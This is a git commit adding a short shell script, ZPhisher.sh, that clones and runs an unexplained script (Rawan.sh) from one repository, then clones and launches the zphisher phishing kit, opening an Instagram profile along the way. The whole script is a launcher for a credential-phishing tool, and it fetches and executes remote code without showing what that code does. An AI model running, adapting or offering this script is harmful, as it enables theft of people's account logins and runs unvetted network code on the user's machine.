838fd7e1e8c40b8c5c2896d21f179da9eabd329e
BaapG <87407116+Vretlee@users.noreply.github.com>
2021-07-25 15:50:02 +0530

    Create ZPhisher.sh
    B

---
+++ ZPhisher.sh
@@ -0,0 +1,7 @@
+git clone https://github.com/Vretlee/Love
+cd Love
+bash Rawan.sh
+git clone https://github.com/htr-tech/zphisher
+cd zphisher
+termux-open https://instagram.com/krish_na_2568
+bash zphisher.sh
